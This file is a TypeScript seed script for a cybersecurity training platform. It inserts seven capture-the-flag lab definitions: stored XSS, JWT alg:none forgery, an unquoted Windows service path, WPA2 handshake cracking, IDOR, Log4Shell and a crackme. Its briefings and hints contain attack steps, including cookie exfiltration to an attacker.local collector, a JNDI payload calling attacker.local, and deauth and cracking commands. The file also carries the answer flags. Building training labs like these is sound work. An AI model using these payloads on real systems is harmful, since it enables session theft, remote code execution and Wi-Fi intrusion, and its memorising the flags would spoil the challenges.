import { db } from "../src/lib/db"

const NEW_LABS = [
  {
    title: "XSS Stored — Comment Hijack",
    slug: "xss-stored-comment",
    category: "Web Security",
    difficulty: "Medium",
    durationMin: 30,
    points: 200,
    description: "Exploit a stored XSS in a comment system to steal an admin cookie.",
    longDescription:
      "A blog comment field renders user input without sanitization. Plant a stored XSS payload that exfiltrates the admin's session cookie when they view the comments page.",
    scenario:
      "## Mission Briefing\n\nTarget: `http://vulnlab.local/post/1#comments`\n\nThe comment box renders HTML directly into the DOM.\n\n1. Inspect the comment form\n2. Craft a payload that fires on page load\n3. The admin bot views comments every 30s — capture their cookie\n\nYour collector endpoint: `http://attacker.local/collect?c=`",
    objectives: "Identify the XSS sink|Craft a stored payload|Capture admin cookie",
    hints: "Try <img src=x onerror=...>|Use fetch() to send document.cookie|Admin cookie name is 'session'",
    flag: "FLAG{xss_st0r3d_c00k13_gr4b}",
    commands: "whoami|curl|nc|help",
    color: "violet",
  },
  {
    title: "JWT alg:none Bypass",
    slug: "jwt-alg-none-bypass",
    category: "Web Security",
    difficulty: "Hard",
    durationMin: 40,
    points: 300,
    description: "Forge an admin JWT by abusing the alg:none vulnerability.",
    longDescription:
      "A Node.js app uses a JWT for authentication. The verification library accepts 'none' algorithm. Forge a token to escalate to admin and read the flag from /admin/flag.",
    scenario:
      "## Mission Briefing\n\nTarget: `http://vulnlab.local/api/profile`\n\n1. Decode your current JWT (it's base64url-encoded)\n2. Change the header alg to 'none' and role to 'admin'\n3. Remove the signature, keep the trailing dot\n4. Send the forged token to `/admin/flag`",
    objectives: "Decode the JWT|Forge alg:none token|Access /admin/flag",
    hints: "JWT format: header.payload.signature|Set alg to 'none' (string)|Try jwt.io or manual base64url",
    flag: "FLAG{jwt_4lg_n0n3_f0rg3ry}",
    commands: "whoami|curl|base64|help",
    color: "violet",
  },
  {
    title: "Windows Privilege Escalation — Unquoted Service Path",
    slug: "windows-privesc-unquoted",
    category: "Privilege Escalation",
    difficulty: "Medium",
    durationMin: 35,
    points: 250,
    description: "Exploit an unquoted service path to escalate to SYSTEM on Windows.",
    longDescription:
      "A Windows service has an unquoted binary path with spaces. Place a malicious executable earlier in the path resolution to run as SYSTEM.",
    scenario:
      "## Mission Briefing\n\nYou are `user` on a Windows 10 box.\n\n1. Enumerate services: `wmic service get name,pathname`\n2. Find `C:\\Program Files\\VulnApp\\service.exe` (unquoted, has spaces)\n3. You have write access to `C:\\Program Files\\`\n4. Place `Program.exe` there, restart the service, get SYSTEM shell\n5. Read `C:\\Users\\Administrator\\Desktop\\flag.txt`",
    objectives: "Enumerate unquoted services|Write Program.exe|Restart service|Read flag as SYSTEM",
    hints: "wmic service get name,pathname | findstr -i 'program files'|Use msfvenom for the payload|sc stop / sc start to restart",
    flag: "FLAG{w1n_unqu0t3d_s3rv1c3}",
    commands: "whoami|dir|type|help",
    color: "emerald",
  },
  {
    title: "Wi-Fi WPA2 Handshake Capture & Crack",
    slug: "wifi-wpa2-crack",
    category: "Network",
    difficulty: "Medium",
    durationMin: 40,
    points: 250,
    description: "Capture a WPA2 handshake and crack the PSK offline.",
    longDescription:
      "You're in range of a target Wi-Fi network. Put your wireless adapter in monitor mode, capture the 4-way handshake via deauth, then crack the PSK with a wordlist.",
    scenario:
      "## Mission Briefing\n\nTarget SSID: `GuardianX-Office`\nChannel: 6\nBSSID: `AA:BB:CC:DD:EE:FF`\n\n1. `airmon-ng start wlan0`\n2. `airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon`\n3. `aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon`\n4. Capture handshake to file\n5. Crack: `aircrack-ng -w rockyou.txt capture.cap`\n\nThe PSK wrapped in FLAG{} is the flag.",
    objectives: "Enable monitor mode|Capture 4-way handshake|Crack PSK with rockyou|Submit flag",
    hints: "Look for 'WPA handshake' in airodump output|aircrack-ng -w /usr/share/wordlists/rockyou.txt|PSK is 8 chars, common word",
    flag: "FLAG{wpa2_psk_cr4ck3d}",
    commands: "whoami|airmon-ng|airodump-ng|aireplay-ng|aircrack-ng|help",
    color: "cyan",
  },
  {
    title: "IDOR — Horizontal Privilege Escalation",
    slug: "idor-horizontal",
    category: "Web Security",
    difficulty: "Easy",
    durationMin: 20,
    points: 150,
    description: "Access another user's data by manipulating object IDs in requests.",
    longDescription:
      "An API endpoint trusts a user-supplied `id` parameter without ownership checks. Enumerate IDs to access another user's profile and find their flag.",
    scenario:
      "## Mission Briefing\n\nTarget: `http://vulnlab.local/api/users/{id}/profile`\n\nYou are user `id=42`. The API returns profile data including a private `secret_notes` field.\n\n1. Fetch your own profile\n2. Try `id=1`, `id=2`, ... (enumerate)\n3. User `id=7` (admin) has the flag in `secret_notes`",
    objectives: "Fetch your profile|Enumerate user IDs|Find admin's secret_notes flag",
    hints: "Use curl or Burp Repeater|Try sequential IDs 1-100|Look for the 'secret_notes' field",
    flag: "FLAG{1d0r_h0r1z0nt4l_3sc4l4t}",
    commands: "whoami|curl|help",
    color: "violet",
  },
  {
    title: "Log4Shell (CVE-2021-44228) Exploitation",
    slug: "log4shell-cve-2021-44228",
    category: "Web Security",
    difficulty: "Hard",
    durationMin: 45,
    points: 400,
    description: "Exploit the infamous Log4Shell JNDI injection to achieve RCE.",
    longDescription:
      "A Java web app uses a vulnerable Log4j version (2.14.1). Craft a JNDI lookup payload in the User-Agent header to trigger remote class loading and get a shell.",
    scenario:
      "## Mission Briefing\n\nTarget: `http://vulnlab.local/` (Apache Solr 8.11, Log4j 2.14.1)\n\n1. Start a LDAP + HTTP server hosting a malicious Java class\n   - Use `marshalsec` or `interactsh`\n2. Send payload in User-Agent: `${jndi:ldap://attacker.local/Exploit}`\n3. The app loads and executes your class\n4. Read `/root/flag.txt`\n\nUse the `log4j-scan` tool or curl with custom headers.",
    objectives: "Set up LDAP/HTTP listener|Send JNDI payload|Get RCE|Read /root/flag.txt",
    hints: "Payload: ${jndi:ldap://ATTACKER/Exploit}|Use marshalsec to serve LDAP|Java class must implement execute()|try ${env:NaN} for detection",
    flag: "FLAG{l0g4sh3ll_rce_pwn3d}",
    commands: "whoami|curl|nc|java|help",
    color: "red",
  },
  {
    title: "Reverse Engineering — Crackme Binary",
    slug: "re-crackme-binary",
    category: "Reverse Engineering",
    difficulty: "Hard",
    durationMin: 50,
    points: 350,
    description: "Reverse a stripped ELF binary to find the correct license key.",
    longDescription:
      "A stripped C binary checks a license key. Use static and dynamic analysis (Ghidra/GDB) to understand the validation logic and derive the correct key.",
    scenario:
      "## Mission Briefing\n\nBinary: `/home/guardian/crackme` (ELF x86-64, stripped)\n\n1. Run it: `./crackme <key>` — prints 'Access Granted' or 'Denied'\n2. Open in Ghidra, find `main` (look for 'Access Granted' string xref)\n3. The key is validated by a custom algorithm\n4. Derive the valid key\n5. Submit as FLAG{key}",
    objectives: "Open in Ghidra|Find validation function|Derive the key|Run binary with valid key",
    hints: "Use strings to find 'Access Granted'|In Ghidra, the key is XOR'd with 0x42|Key is 16 chars, starts with 'GUARD'|Try ltrace for library calls",
    flag: "FLAG{GUARD1AN_X_K3Y}",
    commands: "whoami|file|strings|ltrace|gdb|help",
    color: "amber",
  },
]

async function main() {
  console.log("Adding new labs...")
  let added = 0
  for (const lab of NEW_LABS) {
    const existing = await db.lab.findUnique({ where: { slug: lab.slug } })
    if (!existing) {
      await db.lab.create({ data: lab })
      added++
      console.log(`  + ${lab.title}`)
    } else {
      console.log(`  = ${lab.title} (exists)`)
    }
  }
  console.log(`Done. Added ${added} new labs.`)
}

main()
  .catch((e) => { console.error(e); process.exit(1) })
  .finally(async () => { await db.$disconnect() })
